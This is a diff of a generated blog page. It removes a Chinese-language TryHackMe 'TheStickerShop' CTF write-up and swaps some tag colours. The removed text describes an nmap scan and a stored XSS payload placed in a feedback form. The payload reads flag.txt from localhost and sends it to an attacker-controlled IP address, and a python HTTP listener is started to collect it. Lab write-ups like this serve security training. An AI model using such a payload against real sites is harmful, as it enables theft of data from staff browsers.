@@ -198,24 +198,7 @@
     <div class="description">
         <div class="content" v-pre>
             
-            <p>ad</p>
-<p>nmap进行扫描：</p>
-<p>![屏幕截图 2025-04-01 152515](..&#x2F;TheStickerShop&#x2F;屏幕截图 2025-04-01 152515.png)</p>
-<p>发现开放了一个8080端口，其他端口都有防火墙。然后访问发现是一个页面，有个feedback，这里注意到短期时间内会有员工来看，就提供了xss攻击的条件。</p>
-<pre><code class="language-js">&lt;script&gt;
-fetch(&#39;http://127.0.0.1:8080/flag.txt&#39;)
-  .then(response =&gt; response.text())
-  .then(data =&gt; &#123;
-    fetch(&#39;http://10.17.33.100/?data=&#39; + encodeURIComponent(data))
-  &#125;)
-&lt;/script&gt;
-</code></pre>
-<p>![屏幕截图 2025-04-01 152611](..&#x2F;TheStickerShop&#x2F;屏幕截图 2025-04-01 152611.png)</p>
-<p>开启python服务：</p>
-<p>sudo python3 -m http.server 80</p>
-<p>然后执行js代码，让目标机器把flag.txt给带出来。</p>
-<p>![屏幕截图 2025-04-01 152855](..&#x2F;TheStickerShop&#x2F;屏幕截图 2025-04-01 152855.png)</p>
-
+            <p>nmap进行扫描：</p>
             
         </div>
     </div>
@@ -229,7 +212,7 @@ fetch(&#39;http://127.0.0.1:8080/flag.txt&#39;)
         
         <span class="tag">
             
-            <a href="/tags/THM/" style="color: #00bcd4">THM</a>
+            <a href="/tags/THM/" style="color: #ffa2c4">THM</a>
         </span>
         
     </div>
@@ -299,7 +282,7 @@ fetch(&#39;http://127.0.0.1:8080/flag.txt&#39;)
         
         <span class="tag">
             
-            <a href="/tags/THM/" style="color: #00a596">THM</a>
+            <a href="/tags/THM/" style="color: #00bcd4">THM</a>
         </span>
         
     </div>
@@ -338,7 +321,7 @@ fetch(&#39;http://127.0.0.1:8080/flag.txt&#39;)
         
         <span class="tag">
             
-            <a href="/tags/THM/" style="color: #ff7d73">THM</a>
+            <a href="/tags/THM/" style="color: #00a596">THM</a>
         </span>
         
     </div>
